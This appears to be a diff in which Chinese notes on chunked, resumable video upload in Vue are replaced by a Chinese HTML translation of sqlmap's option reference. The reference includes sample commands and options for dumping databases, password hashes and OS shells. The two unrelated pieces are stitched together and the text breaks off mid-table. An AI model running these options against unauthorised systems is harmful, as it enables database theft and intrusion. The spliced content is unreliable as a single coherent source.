-<li><strong>为什么</strong>: 文件内容 MD5 用于秒传判断(服务端去重),uniqueFileName 用于前端断点续传状态恢复(localStorage key);同一文件被不同用户上传时 fileMd5 相同但 uniqueFileName 不同,避免状态混乱</li>
-<li><strong>踩坑</strong>: 多用户上传同一文件时断点续传状态互相覆盖,A 用户续传了 B 用户的进度</li>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	——————————————————————————————————
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Options（选项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--version 显示程序的版本号并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-h, --help 显示此帮助消息并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-v VERBOSE 详细级别：0-6（默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		保存进度继续跑：
+	</li>
 </ul>
-<h2 id="4-视频时长和-MD5-计算必须用-await-串行-不能依赖-Promise-链式"><a href="#4-视频时长和-MD5-计算必须用-await-串行-不能依赖-Promise-链式" class="headerlink" title="4. 视频时长和 MD5 计算必须用 await 串行,不能依赖 Promise 链式"></a>4. 视频时长和 MD5 计算必须用 await 串行,不能依赖 Promise 链式</h2><ul>
-<li><strong>规则</strong>: 用 <code>await getFileMd5(file).then()</code> 而非单独 <code>getFileMd5(file).then()</code>,确保 fileMd5 变量在后续代码执行前已赋值</li>
-<li><strong>为什么</strong>: 示例代码中 <code>let fileMd5 = &quot;&quot;</code> 在 await 外层声明,如果不 await 直接进入下一步,fileMd5 仍是空字符串导致秒传判断失效</li>
-<li><strong>踩坑</strong>: 文件明明已存在服务端,前端仍然重新上传所有分片,因为 fileMd5 为空字符串跳过了秒传检查</li>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br style="color:#444444;" />
+<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span>
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Target（目标）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	以下至少需要设置其中一个选项，设置目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-d DIRECT 直接连接到数据库。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-u URL, --url=URL 目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-l LIST 从Burp或WebScarab代理的日志中解析目标。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-r REQUESTFILE 从一个文件中载入HTTP请求。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-g GOOGLEDORK 处理Google dork的结果作为目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-c CONFIGFILE 从INI配置文件中加载选项。
+	</li>
 </ul>
-<h2 id="5-文件类型校验用-MIME-type-的扩展名部分-不用-file-name-后缀"><a href="#5-文件类型校验用-MIME-type-的扩展名部分-不用-file-name-后缀" class="headerlink" title="5. 文件类型校验用 MIME type 的扩展名部分,不用 file.name 后缀"></a>5. 文件类型校验用 MIME type 的扩展名部分,不用 file.name 后缀</h2><ul>
-<li><strong>规则</strong>: <code>const ext = &#39;.&#39; + file.type.split(&#39;/&#39;)[1]</code> 然后匹配白名单,不用正则提取 file.name 的 <code>.mp4</code></li>
-<li><strong>为什么</strong>: file.name 可被用户随意修改(改后缀欺骗),file.type 是浏览器根据文件头判断的 MIME 类型更可靠</li>
-<li><strong>踩坑</strong>: 用户把 <code>.exe</code> 改成 <code>.mp4</code> 绕过前端校验上传恶意文件</li>
-<li><strong>例外</strong>: 需要支持无扩展名文件或浏览器无法识别的自定义格式时必须结合后端二次校验</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Request（请求）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定如何连接到目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--data=DATA 通过POST发送的数据字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie=COOKIE HTTP Cookie头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie-urlencode URL 编码生成的cookie注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--drop-set-cookie 忽略响应的Set - Cookie头信息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--user-agent=AGENT 指定 HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 使用随机选定的HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--referer=REFERER 指定 HTTP Referer头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--headers=HEADERS 换行分开，加入其他的HTTP头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cert=ACERT HTTP认证证书（key_file，cert_file）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy=PROXY 使用HTTP代理连接到目标URL
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--ignore-proxy 忽略系统默认的HTTP代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--retries=RETRIES 连接超时后重新连接的时间（默认3）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-url=SAFURL 在测试过程中经常访问的url地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
+	</li>
 </ul>
-<h2 id="6-分片大小固定为构造函数参数-不根据文件大小动态调整"><a href="#6-分片大小固定为构造函数参数-不根据文件大小动态调整" class="headerlink" title="6. 分片大小固定为构造函数参数,不根据文件大小动态调整"></a>6. 分片大小固定为构造函数参数,不根据文件大小动态调整</h2><ul>
-<li><strong>规则</strong>: <code>this.chunkSize</code> 在组件初始化时设定(如 5MB),所有文件用同一分片大小,最后一片用 <code>file.size % chunkSize</code></li>
-<li><strong>为什么</strong>: 动态分片(大文件用大分片)会导致断点续传时分片边界对不上,服务端合并文件时校验失败;固定分片简化状态管理</li>
-<li><strong>踩坑</strong>: 用户上传 10GB 文件时前端自动改用 50MB 分片,断点续传时服务端期望 5MB 分片导致合并失败</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Enumeration（枚举）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br />
+您自己的SQL语句。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-b, --banner 检索数据库管理系统的标识
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 检索数据库管理系统当前用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 检索数据库管理系统当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 检测DBMS当前用户是否DBA
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 枚举数据库管理系统用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 枚举数据库管理系统用户密码哈希
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--privileges 枚举数据库管理系统用户的权限
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--roles 枚举数据库管理系统用户的角色
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 枚举数据库管理系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-D DBname 要进行枚举的指定数据库名
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tables 枚举的DBMS数据库中的表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--columns 枚举DBMS数据库表列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump 转储数据库管理系统的数据库中的表项
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump-all 转储所有的DBMS数据库表中的条目
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--search 搜索列（S），表（S）和/或数据库名称（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-C COL 要进行枚举的数据库列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-U USER 用来进行枚举的数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--exclude-sysdbs 枚举表时排除系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--start=LIMITSTART 第一个查询输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--stop=LIMITSTOP 最后查询的输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--first=FIRSTCHAR 第一个查询输出字的字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--last=LASTCHAR 最后查询的输出字字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-query=QUERY 要执行的SQL语句
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-shell 提示交互式SQL的shell
+	</li>
 </ul>
-<h2 id="7-上传列表用-MD5-去重而非文件名-允许同名不同内容文件"><a href="#7-上传列表用-MD5-去重而非文件名-允许同名不同内容文件" class="headerlink" title="7. 上传列表用 MD5 去重而非文件名,允许同名不同内容文件"></a>7. 上传列表用 MD5 去重而非文件名,允许同名不同内容文件</h2><ul>
-<li><strong>规则</strong>: <code>files.findIndex(item =&gt; item.md5 === fileMd5)</code> 判断重复,不用 <code>item.name === file.name</code></li>
-<li><strong>为什么</strong>: 用户可能上传多个同名但内容不同的文件(如不同版本的 <code>video.mp4</code>),用文件名去重会误杀;MD5 相同才是真正的重复文件</li>
-<li><strong>踩坑</strong>: 用户选择新版本 <code>final.mp4</code> 覆盖旧版本,前端因文件名相同拒绝添加</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Optimization（优化）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于优化SqlMap的性能。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-o 开启所有优化开关
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--predict-output 预测常见的查询输出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--keep-alive 使用持久的HTTP（S）连接
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--null-connection 从没有实际的HTTP响应体中检索页面长度
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
+	</li>
 </ul>
-<h2 id="8-每个文件对象必须包含独立的-cancel-令牌-不共用全局取消器"><a href="#8-每个文件对象必须包含独立的-cancel-令牌-不共用全局取消器" class="headerlink" title="8. 每个文件对象必须包含独立的 cancel 令牌,不共用全局取消器"></a>8. 每个文件对象必须包含独立的 cancel 令牌,不共用全局取消器</h2><ul>
-<li><strong>规则</strong>: fileblock 结构中 <code>cancel: null</code> 字段存储该文件的 axios CancelToken,删除文件时调用 <code>file.cancel()</code></li>
-<li><strong>为什么</strong>: 多文件并行上传时,取消单个文件不应影响其他文件;共用全局 CancelToken 会导致取消一个文件时所有上传中断</li>
-<li><strong>踩坑</strong>: 用户删除列表中第 2 个文件,结果所有文件上传都停止</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Injection（注入）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-p TESTPARAMETER 可测试的参数（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbms=DBMS 强制后端的DBMS为此值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os=OS 强制后端的DBMS操作系统为这个值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--prefix=PREFIX 注入payload字符串前缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--suffix=SUFFIX 注入payload字符串后缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tamper=TAMPER 使用给定的脚本（S）篡改注入数据
+	</li>
 </ul>
-<h2 id="9-视频时长获取用-video-元素-loadedmetadata-事件-不用-canplaythrough"><a href="#9-视频时长获取用-video-元素-loadedmetadata-事件-不用-canplaythrough" class="headerlink" title="9. 视频时长获取用 video 元素 loadedmetadata 事件,不用 canplaythrough"></a>9. 视频时长获取用 video 元素 loadedmetadata 事件,不用 canplaythrough</h2><ul>
-<li><strong>规则</strong>: 创建临时 <code>&lt;video&gt;</code> 元素,监听 <code>loadedmetadata</code> 事件读取 <code>duration</code>,不等待 <code>canplaythrough</code></li>
-<li><strong>为什么</strong>: loadedmetadata 只需加载元数据(几百 KB)即可获取时长,canplaythrough 需要缓冲足够播放数据(可能几十 MB),大文件会等很久</li>
-<li><strong>踩坑</strong>: 获取 5GB 视频时长等待 30 秒,因为浏览器在缓冲可播放数据</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Detection（检测）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--level=LEVEL 执行测试的等级（1-5，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--risk=RISK 执行测试的风险（0-3，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--string=STRING 查询时有效时在页面匹配字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--regexp=REGEXP 查询时有效时在页面匹配正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--text-only 仅基于在文本内容比较网页
+	</li>
 </ul>
-<h2 id="10-文件切片用-Blob-slice-而非读取到内存再分割"><a href="#10-文件切片用-Blob-slice-而非读取到内存再分割" class="headerlink" title="10. 文件切片用 Blob.slice 而非读取到内存再分割"></a>10. 文件切片用 Blob.slice 而非读取到内存再分割</h2><ul>
-<li><strong>规则</strong>: <code>file.slice(start, end)</code> 返回原文件的视图(不复制数据),循环生成分片数组</li>
-<li><strong>为什么</strong>: slice 是零拷贝操作,10GB 文件切 2000 片只生成 2000 个指针;如果用 FileReader 读取再 split 会瞬间占用 10GB 内存</li>
-<li><strong>踩坑</strong>: 切片 8GB 文件时浏览器标签页崩溃,因为尝试把整个文件读入 ArrayBuffer</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Techniques（技巧）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于调整具体的SQL注入测试。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--technique=TECH SQL注入技术测试（默认BEUST）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-cols=UCOLS 定列范围用于测试UNION查询注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-char=UCHAR 用于暴力猜解列数的字符
+	</li>
 </ul>
-<h2 id="11-上传状态用枚举字符串而非数字-方便调试和日志"><a href="#11-上传状态用枚举字符串而非数字-方便调试和日志" class="headerlink" title="11. 上传状态用枚举字符串而非数字,方便调试和日志"></a>11. 上传状态用枚举字符串而非数字,方便调试和日志</h2><ul>
-<li><strong>规则</strong>: <code>status: &#39;准备&#39; | &#39;上传中&#39; | &#39;暂停&#39; | &#39;完成&#39; | &#39;失败&#39;</code>,不用 <code>status: 0 | 1 | 2 | 3 | 4</code></li>
-<li><strong>为什么</strong>: 控制台和日志直接显示 <code>&quot;上传中&quot;</code> 比 <code>1</code> 可读性强,排查问题时不需要查状态码映射表</li>
-<li><strong>踩坑</strong>: 生产环境日志显示 <code>status: 2</code>,3 个月后没人记得 2 代表什么状态</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Fingerprint（指纹）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-f, --fingerprint 执行检查广泛的DBMS版本指纹
+	</li>
 </ul>
-<h2 id="12-进度条颜色用函数返回而非固定值-根据状态动态变化"><a href="#12-进度条颜色用函数返回而非固定值-根据状态动态变化" class="headerlink" title="12. 进度条颜色用函数返回而非固定值,根据状态动态变化"></a>12. 进度条颜色用函数返回而非固定值,根据状态动态变化</h2><ul>
-<li><strong>规则</strong>: <code>:color=&quot;customColor&quot;</code> 绑定方法,根据 <code>status</code> 返回不同颜色(上传中蓝色&#x2F;完成绿色&#x2F;失败红色)</li>
-<li><strong>为什么</strong>: 用户需要快速识别哪些文件上传失败需要重试,颜色是最直观的视觉反馈</li>
-<li><strong>例外</strong>: 严格遵循设计规范要求统一进度条颜色时不适用</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Brute force（蛮力）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来运行蛮力检查。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-tables 检查存在共同表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-columns 检查存在共同列
+	</li>
 </ul>
-<h2 id="13-文件添加事件用-out-方法触发父组件回调-不用-emit"><a href="#13-文件添加事件用-out-方法触发父组件回调-不用-emit" class="headerlink" title="13. 文件添加事件用 out() 方法触发父组件回调,不用 $emit"></a>13. 文件添加事件用 out() 方法触发父组件回调,不用 $emit</h2><ul>
-<li><strong>规则</strong>: <code>this.out(&#39;OnFileAddStart&#39;, files)</code> 触发自定义事件,父组件通过配置对象传入回调函数</li>
-<li><strong>为什么</strong>: 组件用 <code>Vue.component</code> 全局注册而非单文件组件,out() 是封装的事件总线方法,比 $emit 更灵活(支持非父子组件通信)</li>
-<li><strong>踩坑</strong>: 用 <code>this.$emit(&#39;OnFileAddStart&#39;)</code> 发现父组件收不到事件,因为不是标准的父子组件关系</li>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	User-defined function injection（用户自定义函数注入）：<br />
+这些选项可以用来创建用户自定义函数。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--udf-inject 注入用户自定义函数<br />
+--shared-lib=SHLIB 共享库的本地路径
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	File system access（访问文件系统）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统的底层文件系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+	</li>
 </ul>
-<h2 id="14-多文件上传用-v-for-渲染独立进度条-不用单一进度条显示总进度"><a href="#14-多文件上传用-v-for-渲染独立进度条-不用单一进度条显示总进度" class="headerlink" title="14. 多文件上传用 v-for 渲染独立进度条,不用单一进度条显示总进度"></a>14. 多文件上传用 v-for 渲染独立进度条,不用单一进度条显示总进度</h2><ul>
-<li><strong>规则</strong>: <code>v-for=&quot;(file, index) in files&quot;</code> 为每个文件渲染独立的进度条和操作按钮</li>
-<li><strong>为什么</strong>: 用户需要知道每个文件的具体进度和状态,单一总进度条无法体现哪个文件失败需要重试,也无法单独取消某个文件</li>
-<li><strong>踩坑</strong>: 10 个文件上传时只显示总进度 60%,用户不知道是哪个文件卡住了</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Operating system access（操作系统访问）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用于访问后端数据库管理系统的底层操作系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-cmd=OSCMD 执行操作系统命令
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-shell 交互式的操作系统的shell
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-pwn 获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-bof 存储过程缓冲区溢出利用
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--priv-esc 数据库进程用户权限提升
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--msf-path=MSFPATH Metasploit Framework本地的安装路径
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tmp-path=TMPPATH 远程临时文件目录的绝对路径
+	</li>
 </ul>
-<h2 id="15-文件-URL-和时长用-v-model-双向绑定输入框-支持手动修改"><a href="#15-文件-URL-和时长用-v-model-双向绑定输入框-支持手动修改" class="headerlink" title="15. 文件 URL 和时长用 v-model 双向绑定输入框,支持手动修改"></a>15. 文件 URL 和时长用 v-model 双向绑定输入框,支持手动修改</h2><ul>
-<li><strong>规则</strong>: <code>&lt;el-input v-model=&quot;file.url&quot;&gt;</code> 和 <code>&lt;el-input v-model=&quot;file.playtime&quot;&gt;</code> 允许用户编辑</li>
-<li><strong>为什么</strong>: 自动获取的视频时长可能不准确(编码问题),URL 可能需要手动调整路径或添加 CDN 前缀,给用户修正机会</li>
-<li><strong>例外</strong>: 严格的数据一致性要求(如金融场景)禁止手动修改时不适用</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Windows注册表访问：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统Windows注册表。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-read 读一个Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-add 写一个Windows注册表项值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-del 删除Windows注册表键值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-key=REGKEY Windows注册表键
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-value=REGVAL Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-data=REGDATA Windows注册表键值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-type=REGTYPE Windows注册表项值类型
+	</li>
 </ul>
-<hr>
-<h2 id="🔥-5-秒必记-5-条"><a href="#🔥-5-秒必记-5-条" class="headerlink" title="🔥 5 秒必记 5 条"></a>🔥 5 秒必记 5 条</h2><ol>
-<li><strong>先算 MD5 再切片,多文件串行处理防内存爆</strong></li>
-<li><strong>进度用分片计数(upchunk&#x2F;blockNum)不用字节累加,断点续传才准确</strong></li>
-<li><strong>文件内容 MD5(秒传)和唯一标识 MD5(断点续传)必须分开</strong></li>
-<li><strong>分片大小固定不动态调整,否则断点续传边界对不上</strong></li>
-<li><strong>每个文件独立 cancel 令牌,删除单个不影响其他</strong></li>
-</ol>
-<h2 id="决策速查-遇到-X-想-Y"><a href="#决策速查-遇到-X-想-Y" class="headerlink" title="决策速查(遇到 X 想 Y)"></a>决策速查(遇到 X 想 Y)</h2><table>
-<thead>
-<tr>
-<th>遇到</th>
-<th>想</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>多文件同时上传卡死</td>
